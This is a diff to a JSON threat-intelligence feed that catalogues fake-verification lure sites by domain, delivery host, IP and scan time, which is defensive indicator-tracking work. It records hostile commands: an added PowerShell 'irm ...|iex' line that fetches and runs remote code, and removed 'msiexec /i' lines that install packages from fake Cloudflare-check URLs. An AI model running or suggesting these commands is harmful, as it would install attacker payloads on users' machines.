@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "quickrock.mx",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.116"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/a1472443e5d356fc",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29927357",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/a1472443e5d356fc'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/a1472443e5d356fc"
+    ],
+    "ReportId": "cmwwml14703ja0oml9rr46nl1",
+    "ScannedAt": "2026-11-25T21:18:15.069000+00:00"
+  },
+  {
     "UrlDomain": "heelyscanada.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -13474,53 +13500,5 @@
     ],
     "ReportId": "cmwif9m880ztz0oml69lmb145",
     "ScannedAt": "2026-11-15T22:44:38.790000+00:00"
-  },
-  {
-    "UrlDomain": "garrygolden.net",
-    "DeliveryUrl": [
-      "shift-art.com"
-    ],
-    "PayloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "IP": [
-      "162.241.217.246"
-    ],
-    "Related": [
-      {
-        "Value": "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/custo",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake",
-    "ResolvedDownloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "ReportId": "cmwicn28d0ztc0oml2lvkp9eu",
-    "ScannedAt": "2026-11-15T21:31:07.231000+00:00"
-  },
-  {
-    "UrlDomain": "www.tampilkan.com",
-    "DeliveryUrl": [
-      "shift-art.com"
-    ],
-    "PayloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "IP": [
-      "194.5.152.128"
-    ],
-    "Related": [
-      {
-        "Value": "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/custo",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake",
-    "ResolvedDownloadUrl": [
-      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
-    ],
-    "ReportId": "cmwibrmxl0zoa0omlbyzngmgj",
-    "ScannedAt": "2026-11-15T21:06:41.001000+00:00"
   }
 ]
